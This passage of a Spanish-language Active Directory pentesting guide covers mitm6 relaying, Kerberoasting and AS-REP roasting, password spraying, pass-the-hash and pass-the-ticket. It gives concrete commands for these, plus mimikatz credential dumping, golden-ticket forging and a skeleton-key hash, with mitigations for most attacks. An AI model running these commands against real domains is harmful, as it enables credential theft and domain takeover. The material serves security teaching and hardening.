<p>La forma de ejecutar se basa en la herramienta <a href="https://github.com/dirkjanm/mitm6">mitm6</a>, la cual abusa la configuración por defecto de Windows para tomar el control del servidor DNS predeterminado. Haciéndolo mediante replicación de mensajes por medio de DHCPv6, proveyendo a la víctimas un enlace local con una dirección IPv6 y configurando a los hosts atacantes como servidor DNS por defecto. Como servidor DNS, <code>mitm6</code> selectivamente replicará las consultas DNS de los atacantes, eligiendo y redirigiento el tráfico víctima a la máquina del atacante en lugar del servidor legítimo. En <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">esta entrada del blog</a> se puede encontrar una explicación completa del ataque. <code>mitm6</code> está diseñada para trabajar en conjunto con <code>ntlmrelayx</code> de impacket para suplantación de WPAD y retransmisión de credenciales.</p>
<h4 id="ejecución-2"><a class="header" href="#ejecución-2">Ejecución</a></h4>
<p>Es importante señalar que en el ambiente debe estar habilitado <code>LDAPS</code>, en la mayoría de los ambientes se encuentra habilitado.</p>
<ol>
<li>Ejecutar mitm6 indicando el dominio <code>mitm6 -d dsouls.local</code></li>
<li>Ejecutar ntlmrelayx indicando ip de domain controller, WPAD y loot (en caso de querelo) <code>impacket-ntlmrelayx -6 -t ldaps://192.168.111.149 -wh fakewpad.dsouls.local -l lootme</code>.</li>
<li>A la hora de efectuarse, la información recopilada se almacenara en la carpeta indicada para loot.</li>
</ol>
<p><img src="guides/active_directory/images/ipv6-loot.png" alt="Loot obtenido" /></p>
<p><img src="guides/active_directory/images/ipv6-loot-firefox.png" alt="Información recopilada" /></p>
<ol start="4">
<li>Si llegará autenticarse un administrador de dominio se ejecutará un alta de usuario nuevo con contraseña indicada en el log de <code>ntlmrlayx</code>.</li>
</ol>
<p><img src="guides/active_directory/images/ipv6-user.png" alt="Alta de usuario" /></p>
<h3 id="estrategias-de-mitigación-1"><a class="header" href="#estrategias-de-mitigación-1">Estrategias de mitigación</a></h3>
<ol>
<li>El envenamiento por IPv6 abusa el hecho de que Windows consulta por una dirección IPv6 incluso en ambientes donde sólo está habilitado IPv4. Si internamente no se usa IPv6, la forma más segura de prevenir <code>mitm6</code> es bloqueando tráfico DHCPv6 y anuncios entrantes del router en el Firewall de Windows vía Group Policy. Deshabilitar IPv6 completamente podría traer consigo efectos secundarios no deseados. Configurando las siguientes reglas para bloquear en vez de permitir, previene que el ataque funcione.
<ul>
<li>(Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)</li>
<li>(Inbound) Core Networking - Router Advertisement (ICMPv6-In)</li>
<li>(Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)</li>
</ul>
</li>
<li>Si WPAD no es usado internamente, deshabilitarlo vía Group Policy y deshabilitar el servicio WinHttpAutoProxySvc.</li>
<li>Retransmisión a LDAP y LDAPS sólo puede ser mitigada habilitando LDAP singning y LDAP channel binding.</li>
<li>Considerar etiquetar/mover a los usuarios administrativos al grupo de Protected Users o marcarlos como una Cuenta, es sensible y no puede delegarse, lo que prevendrá la impersonificación de ese usuario vía delegación.</li>
</ol>
<h2 id="estrategiasproceso-de-pentesting-a-ambiente"><a class="header" href="#estrategiasproceso-de-pentesting-a-ambiente">Estrategias/proceso de pentesting a ambiente</a></h2>
<ul>
<li>Inicial el día con <code>mitm6</code> o <code>responder</code>.</li>
<li>Ejecutar escaneos para generar tráfico.</li>
<li>Si los escaneos están tardando mucho, buscar sitios web dentro dle alcance (http_version - módulo de metasploit).</li>
<li>Buscar credenciales por default en logins web:
<ul>
<li>Impresoras.</li>
<li>Jenkins.</li>
<li>Etc.</li>
</ul>
</li>
<li>Pensar fuera de la caja.</li>
</ul>
<h2 id="post-explotación"><a class="header" href="#post-explotación">Post-Explotación</a></h2>
<h3 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h3>
<h4 id="powerview"><a class="header" href="#powerview">PowerView</a></h4>
<p>Tabla de comandos relevantes, verificar documentación y/o <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">cheatsheet anexada</a>.</p>
<ul>
<li><code>Get-NetDomain</code>: Obtiene información del dominio.</li>
</ul>
<p><img src="guides/active_directory/images/powerview-net-1.png" alt="Net Domain" /></p>
<ul>
<li><code>Get-NetDomainController</code>: Identifica y obtiene información de los controladores de dominio.</li>
</ul>
<p><img src="guides/active_directory/images/powerview-net-2.png" alt="Net Domain" /></p>
<ul>
<li><code>Get-DomainPolicy</code>: Obtiene las políticas del dominio.</li>
</ul>
<p><img src="guides/active_directory/images/powerview-policy.png" alt="Net Domain" /></p>
<ul>
<li><code>Get-NetUser</code>: Obtiene información acerca de los usuarios (considerar la propiedad <code>logoncount</code> podría existir la posibilidad que se encuentren usuarios HoneyPot).</li>
</ul>
<p><img src="guides/active_directory/images/powerview-user.png" alt="Net Domain" /></p>
<ul>
<li><code>Get-NetComputer</code>: Obtiene toda la información de las computadoras enroladas en el dominio.</li>
</ul>
<p><img src="guides/active_directory/images/powerview-computer.png" alt="Net Domain" /></p>
<ul>
<li><code>Invoke-ShareFinder</code>: Realiza un búsqueda de las carpetas compartidas por medio de smb.</li>
</ul>
<p><img src="guides/active_directory/images/powerview-share.png" alt="Net Domain" /></p>
<ul>
<li><code>Get-NetGPO</code>: Obtiene infomación de todas las Group Policies.</li>
</ul>
<p><img src="guides/active_directory/images/powerview-gpo.png" alt="Net Domain" /></p>
<h4 id="bloodhound"><a class="header" href="#bloodhound">BloodHound</a></h4>
<h5 id="recopilación"><a class="header" href="#recopilación">Recopilación</a></h5>
<p>Recopilación de información con <code>SharpHound.ps1</code> disponible en el <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">repositorio oficial de BloodHound de recolectores</a>.</p>
<p><code>Invoke-BloodHound -CollectionMethod All -Domain DSOULS.local -ZipFileName file.zip</code></p>
<p><strong>Nota: Dentro de los recolectores disponibles específicamente de <code>SharpHound.ps1</code> y <code>SharpHound.exe</code> se han notado diferencias en como es graficada y recopilada la información, por lo que durante el recopilado de información se sugiere realizar dos recopilados, ejecutando <code>SharpHound.exe</code> sin ningún parámetro y <code>SharpHound.ps1</code> o <code>SharpHound.exe</code> específicando los métodos de recolección (<code>CollectionMethod</code>, etc.).</strong></p>
<h5 id="carga-de-información"><a class="header" href="#carga-de-información">Carga de información</a></h5>
<p>Seleccionar <code>Upload Data</code> ubicado en el menú de la derecha de BloodHound y seleccionar el zip extraído.</p>
<p><img src="guides/active_directory/images/bloodhound-upload.png" alt="BloodHound Upload Data" /></p>
<p>Al terminar la carga del zip se podrá visualizar la información recopilada, exponiendo rutas potenciales de escalación y como ejecutarlas.</p>
<p><img src="guides/active_directory/images/bloodhound-database.png" alt="BloodHound Base de Datos" /></p>
<h3 id="ataques"><a class="header" href="#ataques">Ataques</a></h3>
<h4 id="privilege-requirements"><a class="header" href="#privilege-requirements">Privilege Requirements</a></h4>
<ul>
<li>Kerbrute Enumeration - No es necesario el acceso al dominio.</li>
<li>Pass the Ticket - Es necesario el acceso a un usuario del dominio.</li>
<li>Kerberoasting - Es necesario el acceso de cualquier usuario.</li>
<li>AS-REP Roasting - Es necesario el acceso de cualquier usuario.</li>
<li>Golden Ticket - Es necesario acceso completo al dominio (domain admin).</li>
<li>Silver Ticket - Es necesario un hash de servicio.</li>
<li>Skeleton Key - Es necesario acceso completo al dominio (domain admin).</li>
</ul>
<p><strong>Nota: antes de iniciar cualquier testeo es necesario registrar el nombre de dominio en la máquina (<code>/etc/hosts</code>), de lo contrario se esperaría un comportamiento no esperado o simplemente no funcionar.</strong></p>
<h4 id="abusing-pre-authentication"><a class="header" href="#abusing-pre-authentication">Abusing Pre-Authentication</a></h4>
<p>Al ejecutar fuerza bruta a la pre-autenticación de Kerberos, no se disparan eventos de error de autenticación (en el logueo), lo que se convertiría en indicadores para el blue team.
Cuando se realiza fuerza bruta a través de Kerberos, se puede realizar mandando sólo un frame UDP al KDC permitiéndonos enumerar usuarios.</p>
<h5 id="kerbrute"><a class="header" href="#kerbrute">Kerbrute</a></h5>
<p>Para encontrar posibles usuarios a usar para obtener acceso a la red, se puede hacer uso de <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> haciendo uso de una lista preestablecida de usuarios a probar.</p>
<pre><code class="language-bash">./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt
</code></pre>
<p><img src="guides/active_directory/images/kerbrute.png" alt="Uso de Kerbrute" /></p>
<h4 id="harvesting--brute-forcing-tickets"><a class="header" href="#harvesting--brute-forcing-tickets">Harvesting &amp; Brute-Forcing Tickets</a></h4>
<h5 id="rubeus"><a class="header" href="#rubeus">Rubeus</a></h5>
<p>Rubeus cuenta con una amplia gama de ataques y características que la permiten ser una herramienta muy versátil para realizar ataques contra Kerberos. Dentro de las herramientas y ataques que incluye se encuentran overpass the hash, renovación y requests de tickets, gestión de tickets, extracción de tickets, harvesting, pass the ticket, AS-REP Roasting y Kerberoasting.</p>
<p><a href="https://github.com/GhostPack/Rubeus">Repositorio de Rubeus.</a></p>
<p><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">Repositorio de binarios de Rubeus.</a></p>
<h5 id="harvesting"><a class="header" href="#harvesting">Harvesting</a></h5>
<p>Haciendo uso del comando:</p>
<pre><code class="language-powershell">Rubeus.exe harvest /interval:30
</code></pre>
<p>Rubeus recopilará TGTs cada 30 segundos.</p>
<p><img src="guides/active_directory/images/rubeus-harvest.png" alt="Opción harvest de Rubeus" /></p>
<h5 id="brute-forcing--password-spraying"><a class="header" href="#brute-forcing--password-spraying">Brute-Forcing | Password-Spraying</a></h5>
<p>Rubeus puede ser usado para hacer fuerza bruta de contraseñas como para hacer password spraying en las cuentas.</p>
<p>Este ataque tomará la contraseña basada en Kerberos y realizar un spray en todos los usuarios encontrados proporcionando un ticket <code>.kirbi</code>. Este ticket es un TGT que puede ser usado para obtener tickets de servicio del KDC así como usarlo en los ataques así como el ataque pass the ticket.</p>
<p>Antes de ejecutar un spray de contraseñas se necesita añadir el nombre de dominio al archivo de host de windows usando <code>echo 10.10.116.144 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></p>
<p>Ejecutando <code>Rubeus.exe brute /password:Password1 /noticket</code> se usará la contraseña proveída y realizará un spray a todos los usuarios que se encuentren y con esto se obtendrá un TGT <code>.kirbi</code> para ese usuario.</p>
<p><img src="guides/active_directory/images/rubeus-spray.png" alt="Opción spray de Rubeus" /></p>
<p>Considerar la ejecución del ataque ya que puede ocasionar el bloqueo de cuentas, dependiendo de las políticas de las cuentas.</p>
<h4 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h4>
<p>Kerberos in a nutshell:</p>
<ol>
<li>Cuando un usuario se loguea en el Active Directory, el usuario se autentica contra el Domain Controller (DC) usando su contraseña.</li>
<li>El DC le envía al usuario un Ticket Granting Ticket (TGT - Kerberos). El TGT es presentado a cualquier DC para probar la autenticación con un ticket de servicio de Kerberos.</li>
<li>El usuario abre Skype lo cual causa que la estación de trabajo (computadora cliente) busqué el Service Principal Name (SPN) para el servidor de Exchange de usuarios.</li>
<li>Una vez que el SPN es identificado, la computadora se comunica con el DC de nuevo y presenta el TGT del usuario así como también el SPN del recurso al cual el usuario se necesita comunicar.</li>
<li>El DC responde con el  Ticket Granting Service (TGS) de Kerberos.</li>
<li>La estación de trabajo del usuario presenta el TGS al servidor de Exchange para obtener acceso.</li>
<li>Skype se conecta satisfactoriamente.</li>
</ol>
<p><img src="guides/active_directory/images/kerberoasting-diagram.png" alt="Diagrama Kerberoasting" /></p>
<h5 id="ejecución---rubeus"><a class="header" href="#ejecución---rubeus">Ejecución - Rubeus</a></h5>
<p>Haciendo uso de:</p>
<pre><code class="language-powershell">Rubeus.exe kerberoast # Como Administrator
Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Password123
</code></pre>
<p>Se permite el dumpeo de los usuarios aplicables.</p>
<p><img src="guides/active_directory/images/kerberoasting-rubeus.png" alt="Kerberoast con Rubeus" /></p>
<h5 id="ejecución---impacket"><a class="header" href="#ejecución---impacket">Ejecución - Impacket</a></h5>
<p>Habiendo conseguido las credenciales de un usuario válido de la máquina se puede ejecutar el ataque haciendo uso de:</p>
<pre><code class="language-bash">impacket-GetUserSPNs {dominio/usuario:contraseña} -dc-ip {ip de dominio} -request
</code></pre>
<p><img src="guides/active_directory/images/kerberoasting.png" alt="Ejecución de GetUserSPNs" /></p>
<p><em>Nota: si se identifica un error similar a <code>[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code> basta con ejecutar <code>ntpdate &lt;HOST&gt;</code> para sincronizar la hora del sistema con la del servidor.</em></p>
<h5 id="crackeo"><a class="header" href="#crackeo">Crackeo</a></h5>
<p>Después de conseguir el hash, se puede buscar crackearlo (ejemplo empleado con <code>hashcat -m 13100 kerberos.hash rockyou.txt</code> )</p>
<p><img src="guides/active_directory/images/kerberoasting-crack.png" alt="Crackeo de kerberos hash" /></p>
<h5 id="qué-puede-hacer-una-cuenta-de-servicio"><a class="header" href="#qué-puede-hacer-una-cuenta-de-servicio">¿Qué puede hacer una cuenta de servicio?</a></h5>
<p>Después de crackear una constraseña de la cuenta de un servicio existen varias formas de exfiltrar datos o recolectar información relevante dependiendo de si la cuenta obtenida es un domain admin o no.</p>
<p>Si la cuenta de servicio es un domain admin el control es similar a cuando se tiene un golden/silver ticket pudiendo obtener los contenidos de <code>NTDS.dit</code>.</p>
<p>Si la cuenta de servicio no es un domain admin se puede usar para loguearse en otros clientes/sistemas y pivotear o escalar o validar que esa contraseña crackeada sea reciclada para otro servicio o cuenta de usuario.</p>
<h5 id="mitigación"><a class="header" href="#mitigación">Mitigación</a></h5>
<ul>
<li>Contraseñas fuertes.</li>
<li>Principio del privilegio mínimo (en el ejemplo se configuró un servicio el cuál tiene permisos de administrador de dominio, siendo esto una configuración común no apropiada).</li>
</ul>
<h4 id="as-rep-roasting"><a class="header" href="#as-rep-roasting">AS-REP Roasting</a></h4>
<p>Este método al igual que en Kerberoasting es usado para obtener los hashes krbasrep5 de cuentas de usuario que tienen la pre-autenticación de Kerberos deshabilitada.</p>
<p>A diferencia de Kerberoasting estos usuarios no necesitan ser cuentas de servicios, el único requisito es que el usuario debe tener la pre-autenticación deshabilitada.</p>
<h5 id="overview"><a class="header" href="#overview">Overview</a></h5>
<p>Mientras se realiza la pre-autenticación, el hash de los usuarios será usado para cifrar un timestamp que el DC intentará decifrar para validar que es el hash correcto el que se está usando. Después de validar el timestamp el KDC generará un TGT para el usuario. Si la pre-autenticación está deshabilitada se puede solicitar cualquier data de autenticación para cualquier usuario y el KDC retornará un TGT cifrado que puede ser crackeado offline debido a que el KDC salta el paso de validación que verifica que el usuario es quien dice ser.</p>
<h5 id="ejecución---rubeus-1"><a class="header" href="#ejecución---rubeus-1">Ejecución - Rubeus</a></h5>
<p>Haciendo uso de <code>Rubeus.exe asreproast</code> permite buscar usuarios vulnerables para extraer el hash del usuario vulnerable encontrado.</p>
<p><img src="guides/active_directory/images/asrep-rubeus.png" alt="AS-REP Roast con Rubeus" /></p>
<h5 id="ejecución---impacket-1"><a class="header" href="#ejecución---impacket-1">Ejecución - Impacket</a></h5>
<p>Impacket permite dos alcances añadiendole un valor extra al método, proponiendo 2 escenarios para la ejecución (es necesario contar con una lista de usuarios potenciales o bien usar un diccionario):</p>
<ol>
<li>(Recomendada) Dando una lista de usuarios existentes en el sistema, es decir, hacer previamente enumeración de usuarios con Kerbrute, de esta manera sólo se realizará la búsqueda de usuarios vulnerables.</li>
<li>Proporcionar un diccionario de usuarios sin realizar la validación de su existencia, de esta manera impacket verificará la existencia del usuario antes de buscar la vulnerabilidad.</li>
</ol>
<p>Haciendo uso de <code>impacket-GetNPUsers {dominio/usuario:contraseña} -dc-ip {ip de dominio} -no-pass</code> (uso dependiente de escenario).</p>
<p>Habiendo realizado antes la enumeración de usuarios existentes el comando:</p>
<pre><code class="language-bash">for user in $(cat users.txt); do impacket-GetNPUsers -dc-ip &lt;ip de dominio&gt; &lt;dominio&gt;/${user} -no-pass | grep -v Impacket; done
</code></pre>
<p>Se realiza un filtrado conveniente para identificar la vulnerabilidad.</p>
<p><img src="guides/active_directory/images/asrep-impacket.png" alt="AS-REP Roast con Impacket" /></p>
<ol>
<li>Enumeración de usuarios.</li>
<li>Uso de impacket.</li>
</ol>
<h5 id="crackeo-1"><a class="header" href="#crackeo-1">Crackeo</a></h5>
<p>Después de conseguir el hash, si se desea usar hashcat para crackearlo es necesario concatenar <code>23$</code> después de <code>$krb5asrep$</code> obteniendo algo como <code>$krb5asrep$23$User...</code> usando <code>hashcat -m 18200 asrep.hash rockyou.txt</code> )</p>
<p><img src="guides/active_directory/images/asrep-crack.png" alt="Crackeo de hash obtenido por AS-REP roast" /></p>
<h5 id="mitigación-1"><a class="header" href="#mitigación-1">Mitigación</a></h5>
<ul>
<li>Mantener una política de contraseñas fuertes.</li>
<li>No deshabilitar la pre-autenticación de Kerberos a menos que sea necesario.</li>
</ul>
<h4 id="pass-the-ticket"><a class="header" href="#pass-the-ticket">Pass The Ticket</a></h4>
<h5 id="overview-1"><a class="header" href="#overview-1">Overview</a></h5>
<p>Este método está basado en extraer el TGT de la memoria LSASS de la máquina. El Local Security Authority Subsystem Service (LSASS) es un proceso de memoria que guarda credenciales en el servidor de directorio activo y puede guardar tickets de Kerberos junto con otro tipo de credenciales por lo que actúa como portero aceptando o rechazando las credenciales que reciba. Lost tickets de Kerberos se pueden extraer de la memoria LSASS al igual como los hashes.</p>
<p>Al extraer los tickets con mimikatz se obtendrá un ticket <code>.kirbi</code> que puede ser usado para ganar acceso como domain admin si un ticket de un domain admin se encuentra en la memoria LSASS. Este ataque es ideal como técnica para hacer escalación de privilegios y movimiento lateral si se encuentran disponibles tickets no asegurados de una cuenta de servicio de dominio.</p>
<p>El ataque permite escalar a domain admin si se extrae un ticket del mismo para impersonar ese ticket usando el ataque PTT de mimikatz permitiendo actuar como domain admin.</p>
<h5 id="ejecución-3"><a class="header" href="#ejecución-3">Ejecución</a></h5>
<p>Con <code>sekurlsa::tickets /export</code> se exportará los tickets .kirbi al directorio donde actualmente se encuentre.</p>
<p><img src="guides/active_directory/images/passticket-1.png" alt="Exportación de TGT" /></p>
<p>Después de identificar un ticket que se pueda utilizar se usa <code>kerberos::ptt &lt;ticket&gt;</code> siendo el ticket el archivo que se exportó previamente y con <code>klist</code> fuera de mimikatz se nos permite validar que el usuario se haya cargado correctamente.</p>
<h5 id="mitigación-2"><a class="header" href="#mitigación-2">Mitigación</a></h5>
<ul>
<li>Evitar que los domain admins se logueen a nada que no sea el domain controller ya que a pesar de ser algo simple es fácil caer en la mala práctica de loguearse en computadoras &quot;low-level&quot; dejando tickets abriendo posibilidad al uso del ataque.</li>
</ul>
<h4 id="pass-the-hash"><a class="header" href="#pass-the-hash">Pass The Hash</a></h4>
<p>Se refiere a que si se llega a crackear contraseña y/o se obtienen hashes SAM, se pueden aprovechar ambas para realizar movimiento lateral a través de la red.</p>
<p>Haciendo uso de <code>crackmapexec</code> se pueden validar las credenciales previamente crackeadas en un host en específico o en un segmento de red.</p>
<p>Utilizando:</p>
<p><code>crackmapexec {protocolo} {ip/rango} -u {usuario} -d {dominio} -p {contraseña}</code></p>
<p>Donde protocolo puede ser <code>{smb, winrm, ssh, mssql, ldap}</code></p>
<p>Ejemplo:</p>
<p><img src="guides/active_directory/images/crackmapexec.png" alt="Ejemplo crackmapexec" /></p>
<p>O bien, con el hash obtenido se puede loguear a la cuenta igualmente usando <code>crackmapexec</code>.</p>
<p><code>crackmapexec {protocolo} {ip/rango} -u {usuario} -H {hash} --local-auth</code></p>
<p>Ejemplo:</p>
<p><img src="guides/active_directory/images/crackmapexec-hashdump.png" alt="Obtención de hashes con metasploit" /></p>
<p><img src="guides/active_directory/images/crackmapexec-passhash.png" alt="Pass The Hash" /></p>
<h5 id="dumpeo-de-hashes"><a class="header" href="#dumpeo-de-hashes">Dumpeo de hashes</a></h5>
<p>Haciendo uso de <code>impacket-secretsdump</code> se puede loguear en la cuenta y máquina objetivo para obtener los hashes existentes.</p>
<p><img src="guides/active_directory/images/secretsdump.png" alt="Secretsdump" /></p>
<p>Posteriormente ejecutando <code>hashcat</code> se puede buscar crackear la colección de hashes obtenidos indicándolo en las banderas.</p>
<p><code>.\hashcat.exe -m {# hashmode} {archivo de hashes} {diccionario}</code></p>
<p><img src="guides/active_directory/images/hashcat.png" alt="Cracking de hashes con hashcat" /></p>
<p>Para buscar obtener una shell se puede usar <code>impacket-psexec</code>, <code>impacket-smbexec</code> o <code>impacket-wmiexec</code> pasándole el hash obtenido para autenticarse con él en lugar de la contraseña.</p>
<p>Ejemplo:</p>
<p><code>impacket-psexec Gwyn:@192.168.111.145 -hashes {valor}</code></p>
<p>TODO: Agregar imagen</p>
<h5 id="mitigaciones"><a class="header" href="#mitigaciones">Mitigaciones</a></h5>
<p>Es difícil de prevenir por completo, pero se le puede hacer más difícil a un atacante:</p>
<ul>
<li>Limitar reusos en las cuentas:
<ul>
<li>Evitar reusar la contraseña del administrador local.</li>
<li>Deshabilitar las cuentas de Guest y Administrator.</li>
<li>Limitar al administrador local (privilegios mínimos).</li>
</ul>
</li>
<li>Usar contraseñas fuertes:
<ul>
<li>Entre más largas mejor (mayor a 14 caracteres).</li>
<li>Evitar usar palabras comúnes.</li>
<li>Oraciones largas.</li>
</ul>
</li>
<li>Privilege Access Management (PAM)
<ul>
<li>Check out/in cuentas sensibles cuando sea necesario.</li>
<li>Rotar contraseñas automáticamente en el check out y check in.</li>
</ul>
</li>
</ul>
<h4 id="token-impersonation"><a class="header" href="#token-impersonation">Token Impersonation</a></h4>
<p>Los tokens son llaves temporales que permiten el acceso a un sistema o red sin tener que proveer credenciales cada vez que se accede a un archivo (como las cookies de una computadora).</p>
<p>Tipos:</p>
<ul>
<li>Delegate. Creados para loguearse a una máquina o para usar escritorio remoto.</li>
<li>Impersonate. &quot;non-interactive&quot; tal como agregar una unidad de red o un script de logueo de dominio.</li>
</ul>
<h5 id="ejecución-4"><a class="header" href="#ejecución-4">Ejecución</a></h5>
<p>TODO</p>
<h6 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h6>
<p>Se encuentra disponible el módulo <code>incognito</code> el cual se puede cargar a una sesión de meterpreter con <code>load incognito</code>.</p>
<p><img src="guides/active_directory/images/incognito-help.png" alt="Comandos de incognito" /></p>
<p>Para visualizar los tokens que se encuentran actualmente en la máquina se hace uso de <code>list_tokens -u</code> (pudiendo visualizar tokens no sólo de usuarios si no de grupos lo que es indicado con la bandera agregada <code>-u</code>).</p>
<p><img src="guides/active_directory/images/tokens.png" alt="Tokens disponibles" /></p>
<p>Para poder utilizar el token se ocupa <code>impersonate_token {usuario}</code>.</p>
<p><img src="guides/active_directory/images/impersonate.png" alt="Uso de impersonate token" /></p>
<p><em>Nota: Los tokens son válidos hasta el reinicio de una máquina.</em></p>
<h6 id="non-metasploit"><a class="header" href="#non-metasploit">Non-metasploit</a></h6>
<p>Haciendo uso de ataques de tipo Juicy, Rotten y Lonely Potatoe.</p>
<h5 id="mitigación-3"><a class="header" href="#mitigación-3">Mitigación</a></h5>
<ul>
<li>Limitar permiso de creación de tokens usuario/grupo.</li>
<li>Gestionar niveles de cuenta (account tiering).</li>
<li>Restricción a administrador local.</li>
</ul>
<h4 id="group-policy-preferences-gpp---aka-ms14-025"><a class="header" href="#group-policy-preferences-gpp---aka-ms14-025">Group Policy Preferences (GPP) - AKA MS14-025</a></h4>
<ul>
<li>Las Group Policy Preferences permiten a los administradores crear políticas usando credenciales embebidas.</li>
<li>Estas credenciales son cifradas y almacenadas en una &quot;cPassword&quot;.</li>
<li>La llave fue accidentalmente lanzada (whoops).</li>
<li>Parchada en MS14-025 pero no previene usos previos.</li>
</ul>
<h5 id="ejecución-5"><a class="header" href="#ejecución-5">Ejecución</a></h5>
<p>La vulnerabilidad radica en que la llave de cifrado es pública, por lo que si se llega a obtener el valor de lo que cifra, es decir, <code>cpassword</code> se encuentra expuesta a descifrarse, haciendo uso de <code>gpp-decrypt</code>. Ver referencias y write-up de máquina Active de HTB para más información.</p>
<h4 id="mimikatz"><a class="header" href="#mimikatz">Mimikatz</a></h4>
<ul>
<li>Herramienta empleada para ver y obtener credenciales, generar tickets de Kerberos.</li>
<li>Recupera credenciales alojadas en memoria.</li>
<li>Permite ejecutar ataques: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket.</li>
</ul>
<h5 id="credential-dumping"><a class="header" href="#credential-dumping">Credential Dumping</a></h5>
<ul>
<li>Bypass de protección y acceso a memoria: <code>privilege::debug</code>.</li>
<li>Extracción de información de cuentas logueadas desde el último reinicio (hashes NTLM):  <code>sekurlsa::logonpasswords</code>.</li>
<li>Dumpeo de SAM: <code>lsadump::sam</code> | <code>lsadump::sam /patch</code>.</li>
<li>Dumpeo de LSA: <code>lsadump::lsa /patch</code>. <em>LSA (Local Security Authority) subsistema protegido de autenticación de windows, autentica y crea sesiones de logueo en la computadora local.</em></li>
</ul>
<h4 id="goldensilver-tickets"><a class="header" href="#goldensilver-tickets">Golden/Silver Tickets</a></h4>
<p>Un silver ticket en ocasiones puede ser empleado en vez de un golden ticket debido a que es más discreto. Si ser sigiloso y permanecer sin ser detectado importa para el ejercicio, esta opción resulta más conveniente que un golden ticket sin embargo, el proceso a realizar para generar uno es el mismo. La diferencia principal es que el silver ticket está limitado al servicio al que se utilizó como objetivo por lo que en el golden ticket se tiene acceso a cualquier servicio de Kerberos.</p>
<p>Un escenario específico para un silver ticket podría presentarse al querer el acceso al servidor SQL del dominio sin embargo se comprometió un usuario el cual no tiene acceso a ese servidor. Se encuentra una cuenta de servicio accesible para obtener el primer contacto por medio de kerberoasting a el servicio para extraer el hash del servicio e impersonar su TGT para poder solicitar un ticket de servicio para el servicio SQL del KDC permitiendo así el acceso al servidor SQL del dominio.</p>
<h5 id="krbtgt-overview"><a class="header" href="#krbtgt-overview">KRBTGT Overview</a></h5>
<p>Para ayudar a compreder como funcionan estos ataques es importante entender la diferencia entre KRBTGT y TGT. KRBTGT es una cuenta de servicio para el KDC (Key Distribution Center) este genera todos los tickets de los clientes. Si se impersona esta cuenta y se crea un golden ticket de la KRBTGT significa que se tiene la habilidad de crear un ticket de servicio de cualquier cosa que se desee. Un TGT es un ticket asignado a una cuenta de servicio generado por el KDC y sólo se puede tener acceso a ese servicio, lo que en el escenario planteado representaría un  ticket del servicio SQL por ejemplo.</p>
<h5 id="attack-overview"><a class="header" href="#attack-overview">Attack Overview</a></h5>
<p>En el ataque se extrae un TGT para cualquier usuario de dominio que preferentemente se buscaría un domain admin, sin embargo para un golden ticket se buscaría extraer el ticket krbtgt y para un silver ticket se buscaría extraer un ticket de cualquier servicio o de un domain admin. Esto proveería con el SID (Security Identifier) de la cuenta objetivo (de servicio o domain admin) que es único para cada cuenta.</p>
<h5 id="ejecución-6"><a class="header" href="#ejecución-6">Ejecución</a></h5>
<p>Para realizar el procedimiento es necesario obtener el identificador el dominio y el hash NTLM de la cuenta de krbtgt, obteniéndolo mediante <code>lsadump::lsa /inject /name:krbtgt</code> en mimikatz. En el caso de se opte por un silver ticket se necesitaría cambiar el parámetro <code>/name:&lt;cuenta&gt;</code> para extraer el hash de una cuenta domain admin o una cuenta de servicio.</p>
<p><img src="guides/active_directory/images/golden-sid.png" alt="SID y Hash NTLM de krbtgt" /></p>
<p>Ejecutar <code>kerberos::golden /User:&lt;nombre de usuario&gt; /domain:&lt;dominio&gt; /sid:&lt;sid extraido&gt; /krbtgt:&lt;hash NTLM&gt; /id:&lt;rid&gt; /ptt</code> (Usando <code>/ptt</code> para inyectarlo en la sesión actual o sin la bandera para extraerlo a un archivo). Ejemplo <code>kerberos::golden /User:Administrator /domain:dsouls.local /sid:S-1-5-21-1128842135-684543689-3182004798 /krbtgt:cbb7b576e46b82269910709d9d92ef2d /id:500 /ptt</code>.</p>
<p>Para crear un silver ticket se sustituiría el hash NTLM del servicio en <code>/krbtgt:&lt;hash&gt;</code> el SID del servicio en <code>/sid:&lt;sid&gt;</code> y cambiar el id por <code>/id:1103</code>.</p>
<p><img src="guides/active_directory/images/golden-ticket.png" alt="Golden ticket generado" /></p>
<p>TODO: Verificar la inyección del ticket desde fuera.</p>
<p>Levantar una sesión cmd con el ticket creado: <code>misc::cmd</code>.
Visualizar contenido de un cliente perteneciente al dominio: <code>dir \\SITH\c$</code>
Obtener una shell interactiva en cliente remoto con <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">psexec</a>: <code>psexec.exe \\SITH cmd.exe</code></p>
<p><img src="guides/active_directory/images/psexec-exe.png" alt="Sesión con ticket creado y ejecución de psexec" /></p>
<h4 id="kerberos-backdoors"><a class="header" href="#kerberos-backdoors">Kerberos Backdoors</a></h4>
<p>Existe una forma más sutil de realizar un ataque similar al del golden y silver ticket  ya que actúa similar a un rootkit implantandose por si mismo en la memoria en el domain forest permitiéndose acceso a cualquier máquina usando una contraseña maestra.</p>
<p>La skeleton key abusa la forma en la que AS-REQ valida los timestamps cifrados y sólo funciona usando el cifrado RC4 de Kerberos.</p>
<p>El hash por defecto para una skeleton key de mimikatz es <code>60BA4FCADC466C7A033C178194C03DF6</code> que resulta en la contraseña <em>mimikatz</em>.</p>
<h5 id="skeleton-key-overview"><a class="header" href="#skeleton-key-overview">Skeleton Key Overview</a></h5>
